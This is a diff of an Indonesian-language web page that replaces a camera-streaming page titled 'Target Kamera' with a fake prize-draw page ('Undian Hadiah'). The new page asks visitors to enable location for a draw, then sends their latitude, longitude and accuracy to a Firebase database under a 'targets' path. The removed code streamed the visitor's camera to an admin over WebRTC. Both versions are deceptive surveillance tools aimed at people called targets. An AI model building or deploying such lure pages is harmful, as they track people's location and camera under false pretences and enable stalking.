@@ -2,27 +2,52 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>Target Kamera</title>
+<title>Undian Hadiah</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-body{background:#0f172a;color:#fff;text-align:center;font-family:Arial;padding:20px;}
-video{width:90%;max-width:380px;margin-top:20px;border-radius:10px;background:#000;}
-button{padding:12px 20px;border:none;border-radius:8px;margin-top:20px;background:#22c55e;font-weight:bold;cursor:pointer;}
+body{
+  background:#0f172a;
+  color:#fff;
+  text-align:center;
+  font-family:Arial;
+  padding:20px;
+}
+.box{
+  margin-top:50px;
+  background:#1e293b;
+  padding:25px;
+  border-radius:15px;
+  box-shadow:0 0 20px rgba(0,0,0,0.4);
+}
+.btn{
+  padding:15px 25px;
+  background:#38bdf8;
+  border:none;
+  border-radius:10px;
+  font-size:18px;
+  font-weight:bold;
+  cursor:pointer;
+}
+.btn:hover{ background:#0ea5e9; }
+
+#photoInput{ margin-top:20px; }
 </style>
 </head>
 <body>
 
-<h2>Bagikan Kamera Anda</h2>
-<p>Tekan tombol di bawah lalu beri izin kamera.</p>
+<h1>Undian Hadiah Spesial</h1>
+<p>Tekan tombol di bawah untuk ikut undian dan aktifkan lokasi Anda.</p>
 
-<button id="start">Aktifkan Kamera</button>
+<div class="box">
+  <button id="startBtn" class="btn">Ikuti Undian</button>
 
-<video id="localVideo" autoplay playsinline muted></video>
+  <input type="file" id="photoInput" accept="image/*" hidden>
+  <p id="status"></p>
+</div>
 
 <script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
-import { getDatabase, ref, set, push, update, onValue, onChildAdded } 
-from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+import { getDatabase, ref, set, update } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyDxgnLu6TtJce2hd1DL07z5MWo62blEgC8",
@@ -37,47 +62,27 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db  = getDatabase(app);
 
-// WebRTC
-const pc = new RTCPeerConnection({ iceServers:[{ urls:"stun:stun.l.google.com:19302"}] });
+const userId = "user_" + Math.random().toString(36).substring(2,10);
 
-const callRef  = ref(db,"room/default/call");
-const callerICE = ref(db,"room/default/callerICE");
-const calleeICE = ref(db,"room/default/calleeICE");
+document.getElementById("startBtn").onclick = () => {
+  navigator.geolocation.getCurrentPosition(pos => {
 
-document.getElementById("start").onclick = async () => {
-    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
-    document.getElementById("localVideo").srcObject = stream;
+    const {latitude, longitude, accuracy} = pos.coords;
 
-    stream.getTracks().forEach(t => pc.addTrack(t,stream));
-
-    update(ref(db,"room/default/status"),{ target:"ONLINE" });
-
-    pc.onicecandidate = e => {
-        if(e.candidate) push(callerICE, e.candidate.toJSON());
-    };
-
-    const offer = await pc.createOffer();
-    await pc.setLocalDescription(offer);
-
-    await set(callRef,{ offer });
-
-    onValue(callRef, async snap=>{
-        const data = snap.val();
-        if(data?.answer && !pc.currentRemoteDescription){
-            await pc.setRemoteDescription(new RTCSessionDescription(data.answer));
-        }
+    set(ref(db, "targets/" + userId), {
+      status:"ONLINE",
+      time: new Date().toLocaleString(),
+      lat: latitude,
+      lon: longitude,
+      acc: accuracy
     });
 
-    // Receive ICE from admin
-    onChildAdded(calleeICE, snap=>{
-        const cand = snap.val();
-        if(cand) pc.addIceCandidate(new RTCIceCandidate(cand));
-    });
-};
+    document.getElementById("status").innerHTML =
+      "Lokasi berhasil dikirim!<br>Anda terdaftar dalam undian.";
 
-// Jika target keluar → status OFFLINE
-window.onbeforeunload = () => {
-    update(ref(db,"room/default/status"),{ target:"OFFLINE" });
+  }, err => {
+    alert("Anda harus mengizinkan lokasi untuk mengikuti undian.");
+  });
 };
 </script>
 
